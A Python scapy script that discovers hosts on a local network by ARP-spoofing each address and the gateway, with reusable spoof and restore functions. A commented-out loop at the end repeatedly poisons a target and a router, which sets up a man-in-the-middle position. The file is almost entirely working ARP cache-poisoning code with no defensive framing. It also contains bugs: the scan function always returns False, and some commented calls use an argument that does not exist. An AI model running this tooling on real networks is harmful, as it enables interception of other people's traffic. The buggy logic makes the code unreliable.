from scapy.all import *
import psutil
import socket
import time
import struct

# disable warnings
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

def get_mac(ip):
    ans = srp1(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=1, verbose=0)
    if ans:
        return ans.src

    return None

def get_if_netmask(iface_name):
    """
    Gets the netmask of an interface.
    """
    iface = conf.ifaces[iface_name]
    for addrs in psutil.net_if_addrs().values():
        for addr in addrs:
            if addr.address == iface.ip:
                return addr.netmask
    return None

def ip_addr_bits(ip):
    """
    Iterator over the bits of an ip address.
    """

    for byte in socket.inet_aton(ip):
        for i in range(7, -1, -1):
            yield (byte >> i) & 1

def netmask_prefix_len(netmask):
    """
    Calculates the prefix length of a netmask.
    It assumes that the netmask is valid.
    """
    result = 0

    for b in ip_addr_bits(netmask):
        if b == 1:
            result += 1
        else:
            break

    return result

def default_gateway_addr():
    """
    The ip address of the default gateway.
    """
    return conf.route.route("0.0.0.0")[2]

def arp_spoof_scan(ip):
    result = False

    gateway = default_gateway_addr()
    if ip == gateway:
        return True

    # we arp spoof both the target and the router
    # without this Apple devices will not reply

    spoof(ip, gateway)         
    spoof(gateway, ip)
        
    mac = get_mac(ip)
    if mac is not None:
        result = True

    restore_spoof(ip, gateway)
    restore_spoof(gateway, ip)
    
    return False

def lan_list(iface_name=conf.iface, scan=arp_spoof_scan):
    local_ip = get_if_addr(conf.iface) # ipv4 address of the interface 

    if local_ip == "0.0.0.0":
        raise Exception("interface should have ipv4 address, ipv6 is not supported")

    netmask = get_if_netmask(iface_name)
    prefix = netmask_prefix_len(netmask)
    
    gateway = default_gateway_addr()

    min_ip_as_num = 0
    for (i, b) in enumerate(ip_addr_bits(gateway)):
        if prefix < i + 1:
            break

        min_ip_as_num += b * 2 ** (31 - i)

    max_ip_as_num = min_ip_as_num
    for j in range(i, 32):
        max_ip_as_num += 2 ** (31 - j)

    ip_as_num = min_ip_as_num
    while ip_as_num <= max_ip_as_num:
        ip_bytes = struct.pack("!I", ip_as_num)
        ip = socket.inet_ntoa(ip_bytes)

        exists = scan(ip)

        if exists:
            print(ip)
       
       
        ip_as_num += 1

def restore_spoof(from_ip, to_ip):
    to_mac = get_mac(to_ip)
    spoof(from_ip, to_ip, to_mac)

def spoof(from_ip, to_ip, mitm_mac=ARP().hwsrc, verbose=False):
    from_mac = get_mac(from_ip)
    send(ARP(pdst=from_ip, hwdst=from_mac, psrc=to_ip, hwsrc=mitm_mac, op="is-at"), verbose=0)    

    if verbose:
        print(f"Sent to {from_ip} : {to_ip} is-at {mitm_mac}")


# target = "192.168.178.80"
# router = "192.168.178.1"

# while True:
#     spoof(target, router)
#     spoof(router, target)
# 
#     time.sleep(1)

# spoof(target, router, restore=True)
# spoof(router, target, restore=True)

# lan_list()
# gw_ip = conf.route.route("0.0.0.0")[2]
# print(gw_ip)
# 
# iface = conf.ifaces[conf.iface]
# print(ifaces)
# 
# print(conf.route)

# get_if_netmask(conf.iface)

lan_list()
